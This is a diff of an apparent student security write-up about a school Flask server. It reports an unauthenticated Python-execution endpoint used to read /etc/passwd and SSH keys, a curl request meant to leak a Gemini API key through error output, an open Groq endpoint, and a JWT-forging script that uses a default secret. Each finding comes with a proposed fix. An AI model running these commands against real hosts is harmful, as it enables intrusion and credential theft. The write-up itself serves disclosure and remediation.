@@ -40,10 +40,11 @@ curl -X PUT http://localhost:8001/api/user \
     "message": "User ID test not a valid GitHub account"
 }
 ```
+***
 
 ## The RCE
 
-While searching for another avenue of exploitation, I came across a function which allows for Python code the be executed with little to no moderation. Basically arbitrary code execution.
+While searching for another avenue of exploitation, I came across a function which allows for Python code the be executed with little to no moderation. Quite literally arbitrary code execution.
 
 ```py
 # /api/python_exec_api.py
@@ -87,7 +88,7 @@ class PythonExec(Resource):
 api.add_resource(PythonExec, "/python")
 ```
 
-The endpoint allows **unauthenticated** arbitrary code execution! Huzzah! So, both locally *AND* online, I can send web requests to execute Python code.
+The endpoint allows **unauthenticated** arbitrary code execution! Huzzah! So, both locally *AND* online, I can send web requests to execute Python code. Funnily enough, the code (written by a competitor in CyberPatriot -- or rather, written via vibe coding) is effectively a backdoor into any downstream system including this one.
 
 So, for example, I can grab `/etc/passwd`:
 ```bash
@@ -104,8 +105,108 @@ I can also grab ssh keys. I can even grab the `.env` if I wanted to, which would
 In short, I smashed it.
 
 
-## Solutions
+### Solutions
 
 The best solution, of course, would be to remove the endpoint entirely, but I haven't done much investigation into what (if anything) is even using this endpoint. As of now, the server is completely open to anybody running arbitrary code on the server, so I guess better me find it than some random person online :D
 
-I'm sure there's likely some way to only permit authenticated people to use the endpoint (and giving that perm to only a few people), but really there's no good way to prevent an RCE with an open endpoint like this.
+I'm sure there's likely some way to only permit authenticated people to use the endpoint (and giving that perm to only a few people) with `@token_required`, but really there's no good way to prevent an RCE with an open endpoint like this. It's also not even immediately clear what is actually using this endpoint so the best option of course would be to *scrap it entirely* or at least add some sort of containerization if it actually is necessary in any capacity
+***
+
+## Exposed API Keys
+
+Looking into `flask/api/gemini_api.py`, we'll see that API keys are exposed in the URL responses:
+```py
+# api/gemini_api.py
+# Build the endpoint url
+endpoint = f"{server}?key={api_key}"
+```
+
+Thus, whenever an error occurs, th endpoint URL (with the API key) is returned to the client:
+```py
+error_details = {
+    'status_code': response.status_code,
+    'response_text': response.text,
+    'endpoint': endpoint, # api key
+    'headers': dict(response.headers)
+}
+```
+
+We can force an error to leak the API key by sending a huge payload:
+```bash
+python3 -c "import json; print(json.dumps({'text': 'x' * 1000000}))" | \
+curl -X POST https://flask.opencodingsociety.com/api/gemini \
+  -H "Content-Type: application/json" \
+  -b cookie.txt \
+  -d @-
+```
+
+I'm not sure if this works yet, because at the time of writing this, I kept on hitting a rater limiter (error `429`) with Gemini. Theoretically, it should work though.
+
+```json
+{"message": "Rate limit exceeded. Please try again later.", "error_code": 429}
+```
+
+### Solution
+
+Instead of returning the endpoint, we can instead log it without returning the endpoint:
+```py
+# api/gemini_api.py
+current_app.logger.error(f"Gemini API error: {endpoint}")
+return {
+    'message': 'Gemini API error',
+    'error_code': response.status_code
+}, 500
+```
+
+***
+## Free LLM Credits!
+
+With the Groq API, no authentication is required, so anybody can use the Flask server's stored API key with Groq:
+```py
+# api/groq_api.py
+class _Generate(resource):
+    def post(self): # has no @token_required()
+```
+
+But alas, the server is safe again (like the path traversal) from no implementation yet!
+```bash
+curl -X POST https://flask.opencodingsociety.com/api/groq \
+> -H "Content-Type: application/json" \
+> -d '{ "messages": [{"role": "users", "content": "Generate 200 words about rust"}]}'
+```
+
+```json
+{"message": "API key not configured"}
+```
+
+### Solution
+
+The fix is simple here: just add a `token_required()` trait:
+```py
+class _Generate(Resource):
+    @token_required()  # add this
+    def post(self):
+```
+***
+
+## Secret Keys
+
+```py
+# __init__.py
+SECRET_KEY = os.environ.get('SECRET_KEY') or 'SECRET_KEY' # secret key for session management
+```
+
+If `SECRET_KEY` isn't set (as an env var), then it defaults to the literal string. From my previous RCE attack, I demonstrated I could overwrite files. Thus, if I wanted to, I could overwrite the `.env` file this forge my own token to put in a backdoor:
+```py
+import jwt
+
+secret = "SECRET_KEY"
+
+# forge token
+token = jwt.encode(
+    {"_uid": "admin"},
+    secret,
+    algorithm:"HS256"
+)
+print(f"Token: {token}")
+```
